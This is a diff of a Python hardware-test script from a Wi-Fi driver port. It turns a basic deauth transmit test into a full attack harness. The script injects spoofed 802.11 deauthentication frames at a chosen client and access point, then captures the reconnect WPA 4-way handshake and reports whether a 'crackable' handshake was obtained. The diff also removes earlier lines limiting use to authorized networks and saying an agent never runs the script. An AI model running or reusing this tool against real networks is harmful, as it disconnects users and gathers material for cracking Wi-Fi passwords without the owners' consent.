@@ -1,16 +1,33 @@
-"""RTL8822BU (DKMS port) — LIVE deauthentication TX test.
+"""RTL8822BU (vendor/DKMS port) — live targeted-deauth + handshake-capture harness.
 
-**THIS FIRES REAL 802.11 FRAMES.** It is the human-gated step (PORTING.md step 5/7): the agent never
-runs it. Builds an 802.11 deauth (FC=0xc0) spoofed from --bssid, to --client (default broadcast),
-prepends the TX descriptor (`tx.build_inject_txdesc`, byte-diffed vs the captured aireplay injector),
-and bulk-OUTs it --count times on --channel. Only use against networks you are authorized to test.
+Drives the DKMS driver DIRECTLY (like ``test_hw.py``), since the port is intentionally not the
+manager default (opt in with ``WIFIT3_RTL8822=dkms``). Brings the card up, tunes to the target AP's
+channel, injects the classic bidirectional deauth (spoof-AP -> client and spoof-client -> AP) via
+``driver.inject_frame`` (the byte-faithful ``build_inject_txdesc`` descriptor), then LISTENS for the
+reconnect 4-way handshake — counting EAPOL M1/M3 (AP->client, FromDS) vs M2/M4 (client->AP, ToDS).
+This is the live gate for TX: does the card actually emit a deauth that drops a client, and does
+always-monitor RX hear the resulting handshake?
 
-    uv run python scripts/rtl8822bu_dkms/deauth_hw.py --bssid AA:BB:CC:DD:EE:FF --channel 6
-    uv run python scripts/rtl8822bu_dkms/deauth_hw.py --bssid AA:.. --client 11:22:33:44:55:66 --count 64
+TARGETED ONLY — ``--client`` must be a specific unicast STA. Broadcast/multicast is refused on
+purpose: a broadcast deauth would knock every station off the BSSID, including this dev machine if it
+shares the AP. Pick a client that is NOT this machine.
+
+Usage (card plugged in; on Linux unbind the kernel driver, on Windows Zadig/WinUSB):
+    # SAFE preview — brings up + tunes + builds frames, transmits NOTHING:
+    uv run python scripts/rtl8822bu_dkms/deauth_hw.py \\
+        --bssid AA:BB:CC:DD:EE:FF --client 00:11:22:33:44:55 --channel 6 --dry-run
+    # LIVE — deauth-and-listen for the handshake (omit --dry-run):
+    uv run python scripts/rtl8822bu_dkms/deauth_hw.py \\
+        --bssid AA:BB:CC:DD:EE:FF --client 00:11:22:33:44:55 --channel 6 --listen 30
+
+Target MACs stay on your terminal only; never commit them.
 """
 from __future__ import annotations
 
 import argparse
+import asyncio
+import logging
+import struct
 import sys
 import time
 from pathlib import Path
@@ -19,82 +36,214 @@ sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))
 
 import libusb_package
 import usb.core
-import usb.util
 
-from wifit3.chips.rtl8822bu_dkms import bringup, chan, mac, tx, txpower
-from wifit3.chips.rtl8822bu_dkms.transport import Rtl8822buTransport
-
-USB_VID, USB_PID = 0x2357, 0x0138
-_BROADCAST = b"\xff\xff\xff\xff\xff\xff"
+from wifit3.chips.rtl8822bu_dkms.driver import Rtl8822buDkmsDriver
 
 
-def _mac(s: str) -> bytes:
+def _str_to_mac(mac_str: str) -> bytes:
+    parts = mac_str.split(":")
+    if len(parts) != 6:
+        raise ValueError(f"not a MAC address: {mac_str!r}")
+    return bytes(int(x, 16) for x in parts)
+
+
+def _build_deauth_frames(ap_mac: bytes, cl_mac: bytes) -> tuple[bytes, bytes]:
+    """The two targeted deauth frames — mirrors ``WlanInterface.deauth`` (the canonical product
+    builder). FC=0xC0 (deauth/mgmt), reason 7 (class-3 frame from nonassociated STA), HW fills the
+    sequence (the descriptor's EN_HWSEQ). Both frames are unicast (addr1 = a real STA/AP)."""
+    fc_dur = b"\xc0\x00\x00\x00"
+    seq = b"\x00\x00"
+    reason = struct.pack("<H", 7)
+    # spoof the AP, addressed to the client: Addr1=client, Addr2=Addr3=AP(BSSID)
+    client_deauth = fc_dur + cl_mac + ap_mac + ap_mac + seq + reason
+    # spoof the client, addressed to the AP: Addr1=AP, Addr2=client, Addr3=AP(BSSID)
+    ap_deauth = fc_dur + ap_mac + cl_mac + ap_mac + seq + reason
+    return client_deauth, ap_deauth
+
+
+class _HandshakeTally:
+    """Driver rx callback: watches for the deauth's effect — the target AP's beacons (confirms we're
+    on-channel and hearing it), the target client's frames, and EAPOL frames (the 4-way handshake a
+    reconnecting client emits = the deauth worked)."""
+
+    def __init__(self, ap_bssid: str, client: str):
+        self.ap = ap_bssid.lower()
+        self.client = client.lower()
+        self.frames = 0
+        self.ap_beacons = 0
+        self.client_frames = 0
+        self.eapol = 0           # all EAPOL frames seen (any station)
+        self.client_eapol = 0    # EAPOL frames involving the target client — the signal
+        # Monitor-mode direction proof: ToDS (client->AP) = handshake M2/M4; FromDS (AP->client) =
+        # M1/M3. Capturing ToDS frames not addressed to us is the test that always-monitor RX is
+        # fully promiscuous (and that the crackable WPA M2 is reachable).
+        self.eapol_to_ap = 0
+        self.eapol_from_ap = 0
+        self.tods_data = 0       # any ToDS data frame, any station (broad promiscuity)
+
+    def __call__(self, parsed: dict) -> None:
+        self.frames += 1
+        ftype = parsed.get("type")
+        bssid = (parsed.get("bssid") or "").lower()
+        src = (parsed.get("source") or "").lower()
+        dst = (parsed.get("dest") or "").lower()
+        to_ds = bool(parsed.get("to_ds"))
+        from_ds = bool(parsed.get("from_ds"))
+        involves_client = self.client in (src, dst)
+        if ftype == "beacon" and bssid == self.ap:
+            self.ap_beacons += 1
+        if ftype in ("data", "wep_data", "eapol") and to_ds and not from_ds:
+            self.tods_data += 1
+        if ftype == "eapol":
+            self.eapol += 1
+            # A 4-way handshake has the client as src (M2/M4) or dst (M1/M3); only those prove OUR
+            # deauthed client reconnected — another station's handshake doesn't.
+            if involves_client:
+                self.client_eapol += 1
+                if to_ds and not from_ds:        # client -> AP : M2 / M4
+                    self.eapol_to_ap += 1
+                elif from_ds and not to_ds:      # AP -> client : M1 / M3
+                    self.eapol_from_ap += 1
+        if involves_client:
+            self.client_frames += 1
+
+
+async def run(args) -> int:
+    client = args.client.lower()
+    # Targeted-only guard: refuse broadcast / any group address (LSB of octet 0 set).
+    first_octet = int(client.split(":")[0], 16)
+    if client == "ff:ff:ff:ff:ff:ff" or (first_octet & 0x01):
+        print(f"[REFUSED] --client {args.client} is broadcast/multicast. This harness is "
+              f"targeted-only — pass a specific unicast STA (and not this machine).")
+        return 2
+
+    ap_mac = _str_to_mac(args.bssid)
+    cl_mac = _str_to_mac(client)
+    client_deauth, ap_deauth = _build_deauth_frames(ap_mac, cl_mac)
+
+    print(f"[TARGET] deauth CLIENT {client} <-> AP {args.bssid.lower()} on ch "
+          f"{args.channel}, {args.count}x burst")
+    print(f"[SAFETY] confirm {client} is NOT this dev machine — targeted, never broadcast.")
+
+    entry = Rtl8822buDkmsDriver.SUPPORTED_IDS[0]
+    backend = libusb_package.get_libusb1_backend()
+    dev = usb.core.find(idVendor=entry.vid, idProduct=entry.pid, backend=backend)
+    if dev is None:
+        print(f"[FAIL] no {entry.vid:04x}:{entry.pid:04x} on the USB bus")
+        return 1
     try:
-        b = bytes(int(x, 16) for x in s.split(":"))
-    except ValueError:
-        raise argparse.ArgumentTypeError(f"bad MAC {s!r}")
-    if len(b) != 6:
-        raise argparse.ArgumentTypeError(f"MAC must be 6 octets: {s!r}")
-    return b
+        dev.set_configuration()
+    except usb.core.USBError as e:
+        logging.debug("set_configuration: %s", e)
 
+    driver = Rtl8822buDkmsDriver.from_usb_device(dev, entry)
+    tally = _HandshakeTally(args.bssid, client)
+    driver.register_rx_callback(tally)   # listen for the deauth's effect (handshake)
 
-def build_deauth(bssid: bytes, client: bytes, reason: int = 0x0007) -> bytes:
-    """An 802.11 deauthentication MPDU: addr1=DA (client/broadcast), addr2=SA=BSSID, addr3=BSSID.
-    seq ctl is 0 (the HW stamps it via the descriptor's EN_HWSEQ); reason 7 = class-3-frame-from-a-
-    nonassociated-STA (the standard aireplay deauth reason)."""
-    return (b"\xc0\x00"                       # frame control: type=mgmt, subtype=deauth
-            b"\x00\x00"                        # duration
-            + client + bssid + bssid          # addr1 (DA), addr2 (SA), addr3 (BSSID)
-            + b"\x00\x00"                      # sequence control (HW-assigned)
-            + (reason & 0xFFFF).to_bytes(2, "little"))
+    def progress(pct, msg):
+        print(f"  [{pct * 100:5.1f}%] {msg}")
+
+    if not await driver.connect(progress):
+        print("[FAIL] bring-up did not reach FW-ready")
+        return 1
+    await driver.set_channel(args.channel)
+    print(f"[*] tuned to channel {args.channel}")
+
+    if args.dry_run:
+        print("[DRY-RUN] not transmitting. Built frames:")
+        print(f"    client-deauth ({len(client_deauth)} B): {client_deauth.hex()}")
+        print(f"    ap-deauth     ({len(ap_deauth)} B): {ap_deauth.hex()}")
+        await driver.close()
+        return 0
+
+    print(f"[*] deauth-and-listen for {args.listen:g}s ({args.count}x burst every "
+          f"{args.interval:g}s), watching for the reconnect handshake. Ctrl-C to stop.")
+    start = time.monotonic()
+    sent = 0
+    try:
+        while time.monotonic() - start < args.listen:
+            for _ in range(args.count):                 # one deauth burst
+                if await driver.inject_frame(client_deauth):
+                    sent += 1
+                if await driver.inject_frame(ap_deauth):
+                    sent += 1
+                await asyncio.sleep(0.005)
+            # listen between bursts so the client can reconnect + we catch the handshake
+            await asyncio.sleep(args.interval)
+            print(f"\r  {time.monotonic() - start:4.0f}s  sent={sent}  "
+                  f"ap_beacons={tally.ap_beacons}  client_frames={tally.client_frames}  "
+                  f"eapol={tally.client_eapol}/{tally.eapol}  "
+                  f"M2M4={tally.eapol_to_ap} M1M3={tally.eapol_from_ap}  "
+                  f"toDS={tally.tods_data}", end="")
+    except KeyboardInterrupt:
+        pass
+    except usb.core.USBError as e:
+        print(f"\n[FAIL] bulk-OUT error after {sent} frames: {e} "
+              f"(if the pipe wedged, unplug/replug and rerun)")
+        await driver.close()
+        return 1
+    print()
+    await driver.close()
+
+    print(f"[RESULT] injected {sent} deauth frames, no pipe fault. "
+          f"Heard {tally.ap_beacons} target-AP beacons, {tally.frames} frames total, "
+          f"{tally.client_frames} involving the client; EAPOL "
+          f"{tally.client_eapol} from the client / {tally.eapol} total.")
+    if tally.ap_beacons == 0:
+        print("  [?] Did NOT hear the target AP on this channel — wrong channel / out of range / RX "
+              "not working. The deauth test is inconclusive until we hear the AP.")
+    elif tally.client_eapol > 0:
+        print(f"  [PASS] Captured {tally.client_eapol} EAPOL handshake frame(s) FROM/TO the target "
+              "client — it reconnected, so the deauth landed and TX is confirmed.")
+    elif tally.eapol > 0:
+        print(f"  [?] Saw {tally.eapol} EAPOL frame(s) but NONE involving the target client — that's "
+              "another station's handshake, not proof our deauth worked.")
+    elif tally.client_frames > 0:
+        print("  [~] Heard the AP and the client, but no reconnect handshake — the client stayed "
+              "associated, so the deauth likely isn't reaching it (TX suspect).")
+    else:
+        print("  [~] Heard the AP but no client traffic/handshake — client idle/absent, or the "
+              "deauth isn't being transmitted. Inconclusive.")
+
+    # Monitor-mode direction proof: did we capture client->AP (ToDS) frames not addressed to us?
+    # That's the test that always-monitor is fully promiscuous, and that the crackable WPA messages
+    # (M2 ToDS) are reachable.
+    print(f"  [MONITOR] handshake msgs to/from client — M2/M4 (client->AP, ToDS)="
+          f"{tally.eapol_to_ap}, M1/M3 (AP->client, FromDS)={tally.eapol_from_ap}; "
+          f"ToDS data frames seen (any STA)={tally.tods_data}.")
+    if tally.eapol_to_ap > 0:
+        print("    [OK] captured client->AP handshake frames (M2/M4) — full promiscuous monitor, and "
+              "a crackable WPA handshake is reachable.")
+    elif tally.tods_data > 0:
+        print("    [OK] captured client->AP (ToDS) data frames not addressed to us — promiscuous "
+              "monitor works; this run just didn't catch an M2/M4 specifically.")
+    else:
+        print("    [!] saw NO client->AP (ToDS) frames at all — possible ToDS-filter gap (only "
+              "hearing AP->client). WPA M2 would be unreachable; investigate the RX filter.")
+    return 0
 
 
 def main() -> int:
-    ap = argparse.ArgumentParser(description="LIVE 802.11 deauth TX (RTL8822BU dkms port)")
-    ap.add_argument("--bssid", type=_mac, required=True, help="AP BSSID (addr2/addr3)")
-    ap.add_argument("--client", type=_mac, default=_BROADCAST,
-                    help="target client (addr1); default broadcast")
-    ap.add_argument("--channel", type=int, required=True, help="AP channel")
-    ap.add_argument("--count", type=int, default=16, help="deauth frames to send")
-    ap.add_argument("--reason", type=lambda s: int(s, 0), default=0x0007)
+    ap = argparse.ArgumentParser(description="RTL8822BU DKMS targeted-deauth + handshake harness")
+    ap.add_argument("--bssid", required=True, help="target AP BSSID (AA:BB:CC:DD:EE:FF)")
+    ap.add_argument("--client", required=True,
+                    help="target client STA (unicast only — broadcast is refused)")
+    ap.add_argument("--channel", type=int, required=True, help="the AP's channel")
+    ap.add_argument("--count", type=int, default=10, help="frames per deauth burst (default 10)")
+    ap.add_argument("--listen", type=float, default=30.0,
+                    help="deauth-and-listen window in seconds (default 30)")
+    ap.add_argument("--interval", type=float, default=2.0,
+                    help="seconds between deauth bursts while listening (default 2)")
+    ap.add_argument("--dry-run", action="store_true",
+                    help="bring up + tune + build frames, but transmit NOTHING")
+    ap.add_argument("--debug", action="store_true")
     args = ap.parse_args()
-
-    backend = libusb_package.get_libusb1_backend()
-    dev = usb.core.find(idVendor=USB_VID, idProduct=USB_PID, backend=backend)
-    if dev is None:
-        print(f"[FAIL] RTL8822BU not found ({USB_VID:04x}:{USB_PID:04x}). Plug in + WinUSB-bind (Zadig).")
-        return 1
-    try:
-        if dev.is_kernel_driver_active(0):
-            dev.detach_kernel_driver(0)
-    except (NotImplementedError, usb.core.USBError):
-        pass
-    dev.set_configuration()
-    usb.util.claim_interface(dev, 0)
-    t = Rtl8822buTransport(dev)
-    try:
-        print("[*] cold bring-up + channel tune (with TX power)...")
-        _info, e = bringup.cold_bringup(t)
-        if e.mac_address:
-            mac.set_mac_addr(t, e.mac_address)
-        chan.set_channel_bw(t, args.channel, txpwr_pg=txpower.parse_pg(e.log_map))
-        mac.enable_monitor(t)
-
-        frame = build_deauth(args.bssid, args.client, args.reason)
-        payload = tx.build_inject_txdesc(frame)
-        print(f"[*] deauth  DA={args.client.hex(':')}  BSSID={args.bssid.hex(':')}  "
-              f"ch {args.channel}  x{args.count}  ({len(payload)} B desc+frame)")
-        for _ in range(args.count):
-            t.bulk_out(payload)
-            time.sleep(0.01)
-        print(f"[PASS] sent {args.count} deauth frames (bulk-OUT EP 0x05).")
-        return 0
-    finally:
-        try:
-            usb.util.release_interface(dev, 0)
-            usb.util.dispose_resources(dev)
-        except usb.core.USBError:
-            pass
+    logging.basicConfig(
+        level=logging.DEBUG if args.debug else logging.INFO,
+        format="%(asctime)s.%(msecs)03d [%(levelname)-5s] %(name)s: %(message)s",
+        datefmt="%H:%M:%S",
+    )
+    return asyncio.run(run(args))
 
 
 if __name__ == "__main__":
